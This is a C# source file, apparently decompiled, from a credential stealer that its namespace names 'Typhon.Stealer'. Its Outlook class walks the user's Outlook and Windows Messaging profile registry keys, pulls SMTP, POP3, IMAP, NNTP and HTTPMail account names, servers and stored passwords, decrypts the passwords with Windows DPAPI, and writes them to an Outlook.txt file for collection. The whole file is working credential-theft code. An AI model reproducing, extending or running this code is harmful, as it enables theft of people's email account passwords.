using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.Win32;

namespace Typhon.Stealer.Software.Messaging
{
	// Token: 0x02000012 RID: 18
	internal class Outlook
	{
		// Token: 0x06000058 RID: 88 RVA: 0x000045C0 File Offset: 0x000027C0
		public static void GrabOutlook(string sSavePath)
		{
			string[] source = new string[]
			{
				"Software\\Microsoft\\Office\\15.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
				"Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
				"Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
				"Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\9375CFF0413111d3B88A00104B2A6676"
			};
			string[] mailClients = new string[]
			{
				"SMTP Email Address",
				"SMTP Server",
				"POP3 Server",
				"POP3 User Name",
				"SMTP User Name",
				"NNTP Email Address",
				"NNTP User Name",
				"NNTP Server",
				"IMAP Server",
				"IMAP User Name",
				"Email",
				"HTTP User",
				"HTTP Server URL",
				"POP3 User",
				"IMAP User",
				"HTTPMail User Name",
				"HTTPMail Server",
				"SMTP User",
				"POP3 Password2",
				"IMAP Password2",
				"NNTP Password2",
				"HTTPMail Password2",
				"SMTP Password2",
				"POP3 Password",
				"IMAP Password",
				"NNTP Password",
				"HTTPMail Password",
				"SMTP Password"
			};
			string text = source.Aggregate("", (string current, string dir) => current + Outlook.Get(dir, mailClients));
			if (string.IsNullOrEmpty(text))
			{
				return;
			}
			Directory.CreateDirectory(sSavePath);
			File.WriteAllText(sSavePath + "\\Outlook.txt", text + "\r\n");
		}

		// Token: 0x06000059 RID: 89 RVA: 0x00004740 File Offset: 0x00002940
		private static string Get(string path, string[] clients)
		{
			string text = "";
			try
			{
				foreach (string text2 in clients)
				{
					try
					{
						object infoFromRegistry = Outlook.GetInfoFromRegistry(path, text2);
						if (infoFromRegistry != null && text2.Contains("Password") && !text2.Contains("2"))
						{
							text = string.Concat(new string[]
							{
								text,
								text2,
								": ",
								Outlook.DecryptValue((byte[])infoFromRegistry),
								"\r\n"
							});
						}
						else if (infoFromRegistry != null && (Outlook.SMTPClient.IsMatch(infoFromRegistry.ToString()) || Outlook.MailClient.IsMatch(infoFromRegistry.ToString())))
						{
							text += string.Format("{0}: {1}\r\n", text2, infoFromRegistry);
						}
						else
						{
							text = string.Concat(new string[]
							{
								text,
								text2,
								": ",
								Encoding.UTF8.GetString((byte[])infoFromRegistry).Replace(Convert.ToChar(0).ToString(), ""),
								"\r\n"
							});
						}
					}
					catch
					{
					}
				}
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(path, false);
				if (registryKey != null)
				{
					text = registryKey.GetSubKeyNames().Aggregate(text, (string current, string client) => current + Outlook.Get(path + "\\" + client, clients));
				}
			}
			catch
			{
			}
			return text;
		}

		// Token: 0x0600005A RID: 90 RVA: 0x000048F4 File Offset: 0x00002AF4
		private static object GetInfoFromRegistry(string path, string valueName)
		{
			object result = null;
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(path, false);
				if (registryKey != null)
				{
					result = registryKey.GetValue(valueName);
					registryKey.Close();
				}
			}
			catch
			{
			}
			return result;
		}

		// Token: 0x0600005B RID: 91 RVA: 0x00004938 File Offset: 0x00002B38
		private static string DecryptValue(byte[] encrypted)
		{
			try
			{
				byte[] array = new byte[encrypted.Length - 1];
				Buffer.BlockCopy(encrypted, 1, array, 0, encrypted.Length - 1);
				return Encoding.UTF8.GetString(ProtectedData.Unprotect(array, null, DataProtectionScope.CurrentUser)).Replace(Convert.ToChar(0).ToString(), "");
			}
			catch
			{
			}
			return "null";
		}

		// Token: 0x04000030 RID: 48
		private static readonly Regex MailClient = new Regex("^([a-zA-Z0-9_\\-\\.]+)@([a-zA-Z0-9_\\-\\.]+)\\.([a-zA-Z]{2,5})$");

		// Token: 0x04000031 RID: 49
		private static readonly Regex SMTPClient = new Regex("^(?!:\\/\\/)([a-zA-Z0-9-_]+\\.)*[a-zA-Z0-9][a-zA-Z0-9-_]+\\.[a-zA-Z]{2,11}?$");
	}
}
